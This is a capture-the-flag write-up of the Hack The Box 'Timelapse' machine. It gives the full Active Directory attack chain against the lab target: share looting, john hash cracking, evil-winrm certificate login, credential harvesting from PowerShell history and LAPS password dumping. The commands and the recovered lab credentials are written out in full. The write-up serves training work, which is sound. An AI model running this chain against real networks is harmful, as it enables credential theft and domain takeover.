---
title: "Timelapse - Writeup"
classes: single
ribbon: LightBlue
categories:
  - writeup
tags:
  - writeups
  - pentest
  - writeup
  - oscp
  - shell
  - exploit
  - htb
  - hackthebox
  - machine
  - easy
  - windows
toc: true
hide_title: true
excerpt: ""
sidebar:
        nav: "menu_writeups"
---

## Timelapse
![](https://kar0nx.github.io/assets/images/writeup/bae443f73a706fc8eebc6fb740128295.png)
## Reconnaissance

IP: 10.10.11.152
## NMAP

```
nmap -T4 -p- -A 10.10.11.152
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-02 13:15 UTC
Nmap scan report for 10.10.11.152
Host is up (0.031s latency).
Not shown: 65518 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-09-02 21:16:55Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2025-09-02T21:18:28+00:00; +7h59m50s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Not valid before: 2021-10-25T14:05:29
|_Not valid after:  2022-10-25T14:25:29
|_http-title: Not Found
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49673/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  msrpc             Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-09-02T21:17:48
|_  start_date: N/A
|_clock-skew: mean: 7h59m50s, deviation: 0s, median: 7h59m49s

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   30.24 ms 10.10.14.1
2   30.58 ms 10.10.11.152

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 197.16 seconds

```

## SMB

```
nxc smb 10.10.11.152 -u "Guest" -p "" --shares
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902152002.png)

```
smbclient \\\\10.10.11.152\\Shares
recures ON
prompt OFF
mget *
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902152326.png)

Starting with DEV folder 

```
zip2john winrm_backup.zip > hash
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902152617.png)

supremelegacy
Now I used pfx2john and cracked password

```
pfx2john legacyy_dev_auth.pfx > hash.pfx
john hash.pfx --wordlist=/usr/share/wordlists/rockyou.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902153001.png)

thuglegacy
Now using the **pfx** file we can generate **.pem** and **.crt** files which will help us to take access to the Windows machine using **WinRM**. In order to generate the pem file, we can simply use the following command: (This will require a password that we do not know. Let us check.)

```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out legacyy_dev_auth.pem
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out legacyy_dev_auth.crt

```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902153941.png)

looks good, Then I used evil-winrm:

```
evil-winrm -i 10.10.11.152 -c legacyy_dev_auth.crt -k legacyy_dev_auth.pem  -u legacyy -S
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902155245.png)

Grab first flag and enumerating users

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902155521.png)

## Privilege Escalation

Start by checking powershell history

```
cd $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
type ConsoleHost_history.txt
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902160837.png)

svc_deploy E3R$Q62^12p7PLlC%KWaxuaV
Finally we have authenticated user:

```
nxc smb 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902161230.png)

Now let's connect via winrm and search for priv esc

```
evil-winrm -i timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -S
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902164725.png)

Searching for priv esc vectors I found that svc_deploy is in LAPS_Readers group

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902165059.png)

Quick google fu and I got answers:
https://www.hackingarticles.in/credential-dumping-laps/

I tried 2 methods to obtain laps credentials:

```
nxc ldap 10.10.11.152 -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' --module laps

impacket-GetLAPSPassword timelapse.htb/svc_deploy:'E3R$Q62^12p7PLlC%KWaxuaV' -dc-ip 10.10.11.152 
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902165339.png)

Ah]jg9/u(eRvBKO%P4Ug(2{;
Now simply connect via winrm and grab root flag

```
evil-winrm -i 10.10.11.152 -u Administrator -p 'Ah]jg9/u(eRvBKO%P4Ug(2{;' -S
```

![](https://kar0nx.github.io/assets/images/writeup/Pasted image 20250902165548.png)

Remember to say WTF?! when you open Administrator Desktop, then navigate to TRX Desktop 